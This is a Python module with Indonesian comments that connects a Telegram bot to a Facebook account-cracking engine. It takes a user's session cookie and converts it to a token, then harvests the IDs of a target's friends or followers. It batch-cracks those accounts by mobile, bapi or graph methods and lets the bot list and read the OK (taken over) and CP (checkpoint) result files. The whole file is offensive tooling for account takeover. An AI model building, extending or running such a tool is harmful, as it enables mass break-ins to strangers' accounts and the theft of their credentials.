#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Modul Integrasi antara Bot Telegram dan Core Engine
Menggunakan modul core yang baru untuk semua operasi
Updated November 2025 - Security: No file storage for cookies
"""

import os
from typing import List, Dict, Tuple, Optional, Callable
from core import FacebookAuth, FacebookDumper, FacebookCracker, Dashboard, CookieParser


class TelegramCrackIntegration:
    """
    Kelas untuk mengintegrasikan fungsi crack dengan Telegram Bot
    
    SECURITY UPDATE: Tidak lagi menyimpan cookie/token di file
    Semua credentials disimpan di memory (UserSession) saja
    """
    
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.cookie: Optional[str] = None
        self.token: Optional[str] = None
        self.id_list: List[str] = []
        
        self.auth: Optional[FacebookAuth] = None
        self.dumper: Optional[FacebookDumper] = None
        self.cracker = FacebookCracker()
        self.dashboard = Dashboard()
    
    def save_cookie(self, cookie: str) -> Tuple[bool, str, Optional[str]]:
        """
        Simpan cookie dan coba dapatkan token
        
        SECURITY: Disimpan di memory saja, tidak di file
        
        Args:
            cookie: Cookie Facebook
            
        Returns:
            Tuple (success, message, token)
        """
        try:
            self.cookie = cookie
            
            self.auth = FacebookAuth()
            success, message, token = self.auth.save_cookie(cookie)
            
            if token:
                self.token = token
            
            self.dumper = FacebookDumper(self.cookie, self.token)
            
            return (success, message, token)
            
        except Exception as e:
            return (False, f"❌ Error: {str(e)}", None)
    
    def dump_publik(
        self, 
        target_id: str, 
        progress_callback: Optional[Callable[[int], None]] = None
    ) -> Tuple[bool, str, List[str]]:
        """
        Dump ID dari target publik
        
        Args:
            target_id: ID target Facebook atau 'me'
            progress_callback: Fungsi callback untuk update progress
            
        Returns:
            Tuple (success, message, id_list)
        """
        if not self.cookie:
            return (False, "❌ Cookie tidak tersedia. Silakan login terlebih dahulu dengan /login", [])
        
        if not self.dumper:
            self.dumper = FacebookDumper(self.cookie, self.token)
        
        try:
            success, message, id_list = self.dumper.dump_public(target_id, progress_callback)
            
            if success:
                self.id_list = id_list
            
            return (success, message, id_list)
            
        except Exception as e:
            return (False, f"❌ Error: {str(e)}", [])
    
    def dump_to_file(
        self, 
        target_id: str, 
        filename: str,
        progress_callback: Optional[Callable[[int], None]] = None
    ) -> Tuple[bool, str]:
        """
        Dump ID dan simpan ke file
        
        Args:
            target_id: ID target
            filename: Nama file output
            progress_callback: Callback progress
            
        Returns:
            Tuple (success, message)
        """
        success, message, id_list = self.dump_publik(target_id, progress_callback)
        
        if not success:
            return (False, message)
        
        if not self.dumper:
            return (False, "❌ Dumper tidak tersedia")
        
        return self.dumper.save_to_file(filename)
    
    def load_from_dump_file(self, filename: str) -> Tuple[bool, str, int]:
        """
        Load ID dari file dump
        
        Args:
            filename: Nama file
            
        Returns:
            Tuple (success, message, count)
        """
        if not self.dumper:
            self.dumper = FacebookDumper(self.cookie or "", self.token)
        
        success, message, count = self.dumper.load_from_file(filename)
        
        if success:
            self.id_list = self.dumper.ids
        
        return (success, message, count)
    
    def crack_batch(
        self,
        id_list: Optional[List[str]] = None,
        method: str = "mobile",
        progress_callback: Optional[Callable[[int, Dict], None]] = None,
        result_callback: Optional[Callable[[Dict], None]] = None
    ) -> Dict:
        """
        Crack batch IDs
        
        Args:
            id_list: List ID atau None untuk menggunakan id_list internal
            method: Metode crack (mobile/bapi/graph)
            progress_callback: Callback progress
            result_callback: Callback hasil
            
        Returns:
            Dict statistik
        """
        if id_list is None:
            id_list = self.id_list
        
        if not id_list:
            return {'total': 0, 'ok': 0, 'cp': 0, 'failed': 0, 'current': 0}
        
        stats = self.cracker.crack_batch(
            id_list,
            method=method,
            progress_callback=progress_callback,
            result_callback=result_callback
        )
        
        return stats
    
    def get_results_ok(self) -> List[Tuple[str, int]]:
        """
        Dapatkan list file hasil OK
        
        Returns:
            List (filename, count)
        """
        try:
            if not os.path.exists("OK"):
                return []
            
            files = os.listdir("OK")
            result = []
            
            for file in files:
                try:
                    with open(f"OK/{file}", "r") as f:
                        count = len(f.readlines())
                    result.append((file, count))
                except:
                    continue
            
            return result
        except:
            return []
    
    def get_results_cp(self) -> List[Tuple[str, int]]:
        """
        Dapatkan list file hasil CP
        
        Returns:
            List (filename, count)
        """
        try:
            if not os.path.exists("CP"):
                return []
            
            files = os.listdir("CP")
            result = []
            
            for file in files:
                try:
                    with open(f"CP/{file}", "r") as f:
                        count = len(f.readlines())
                    result.append((file, count))
                except:
                    continue
            
            return result
        except:
            return []
    
    def read_result_file(self, folder: str, filename: str) -> List[str]:
        """
        Baca isi file hasil
        
        Args:
            folder: Folder (OK/CP)
            filename: Nama file
            
        Returns:
            List isi file
        """
        try:
            filepath = f"{folder}/{filename}"
            if not os.path.exists(filepath):
                return []
            
            with open(filepath, "r", encoding="utf-8") as f:
                return f.readlines()
        except:
            return []
